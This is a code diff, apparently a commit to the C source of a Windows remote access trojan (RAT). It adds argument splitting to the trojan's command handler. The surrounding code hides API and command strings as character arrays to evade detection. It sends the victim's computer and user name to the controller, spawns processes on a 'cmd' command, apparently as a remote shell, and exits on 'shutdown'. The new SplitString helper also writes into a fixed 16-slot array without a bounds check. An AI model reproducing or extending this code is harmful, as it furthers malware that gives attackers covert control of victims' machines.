@@ -41,12 +41,32 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer)
 	return 0;
 }
 
+int SplitString(char* str, char* dest[16], char* seps)
+{
+	int index = 0;
+	
+	char *token = NULL;
+	char *nextToken = NULL;
+	
+	token = strtok_s(str, seps, &nextToken);
+	while( token != NULL )
+	{
+		OutputDebugStringA(token);
+		OutputDebugStringA("\n");
+
+		dest[index++] = token;
+		
+		token = strtok_s(NULL, seps, &nextToken);
+	}
+	return index;
+}
+
 int CALLBACK
 WinMain(HINSTANCE hInstance,
 		HINSTANCE hPrevInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
-{	
+{
 	RATSocket ratSocket = {};
 	
 	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
@@ -146,7 +166,11 @@ WinMain(HINSTANCE hInstance,
 		char ca_info[] = { 'i','n','f','o',0 };
 		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
-		if ( strcmp(recvBuffer, ca_info) == 0 )
+
+		char* splittedCommand[16] = {};
+		SplitString(recvBuffer, splittedCommand, " ");
+		
+		if ( strcmp(splittedCommand[0], ca_info) == 0 )
 		{
 			char bufferError[256];
 			char bufferUser[UNLEN + 1];
@@ -198,7 +222,7 @@ WinMain(HINSTANCE hInstance,
 			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
 			SocketSend(&ratSocket, bufferInfo);
 		}
-		else if ( strcmp(recvBuffer, ca_cmd) == 0 )
+		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
 			PROCESS_INFORMATION pi;
 			STARTUPINFO si = { };
@@ -229,7 +253,7 @@ WinMain(HINSTANCE hInstance,
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
 		}
-		else if ( strcmp(recvBuffer, ca_shutdown) == 0 )
+		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
 			OutputDebugStringA("Received shutdown command.\n");
 			break;
